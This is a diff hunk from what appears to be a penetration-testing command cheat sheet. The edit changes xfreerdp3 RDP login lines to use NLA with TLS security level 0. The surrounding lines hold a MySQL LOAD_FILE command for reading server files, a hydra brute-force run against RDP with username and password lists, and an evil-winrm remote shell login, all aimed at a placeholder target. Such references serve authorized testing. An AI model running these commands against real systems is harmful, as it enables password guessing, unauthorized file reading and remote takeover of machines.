@@ -812,8 +812,8 @@ mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT LOAD_FILE('/
 (hydra -I rdp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
 +---------- Login to Service ----------+
-xfreerdp3 /v:'$TARGET' /d:'' /u:'' /p:'' /cert:ignore /sec:tls +auto-reconnect +clipboard +drive:Downloads,"$HOME/Upload/"
-xfreerdp3 /v:'$TARGET' /d:'$DOM' /u:'$USERNAME' /p:'$PASSWORD' /cert:ignore /sec:tls +auto-reconnect +clipboard +drive:Downloads,"$HOME/Upload/"
+xfreerdp3 /v:'$TARGET' /d:'' /u:'' /p:'' /cert:ignore /sec:nla /tls:seclevel:0 +auto-reconnect +clipboard +drive:Downloads,"/Upload"
+xfreerdp3 /v:'$TARGET' /d:'$DOM' /u:'$USERNAME' /p:'$PASSWORD' /cert:ignore /sec:nla /tls:seclevel:0 +auto-reconnect +clipboard +drive:Downloads,"/Upload"
 
 [*] (5985) WINRM
 evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
